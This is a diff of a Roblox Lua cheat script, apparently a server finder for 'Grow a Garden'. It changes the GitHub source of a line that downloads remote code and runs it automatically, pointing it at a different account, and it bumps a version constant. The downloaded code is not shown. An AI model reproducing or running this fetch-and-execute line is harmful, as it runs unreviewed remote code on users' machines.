@@ -187,7 +187,7 @@ local shf = [[
     if not _G.exeonce then
         _G.exeonce = true
         repeat task.wait() until game:IsLoaded()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/M-E-N-A-C-E/Menace-Hub/refs/heads/main/Old%20Server%20Finder%20Grow%20a%20Garden", true))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/indonesiacomunity92/Menace-Hub/refs/heads/main/Old%20Server%20Finder%20Grow%20a%20Garden", true))()
     end
 ]]
 q(shf)
@@ -202,7 +202,7 @@ local function checkBloodMoon()
     return false
 end
 
-local ts = 1681
+local ts = 1689
 local isOld = game.PlaceVersion == ts
 
 local lastHopAttempt = 0
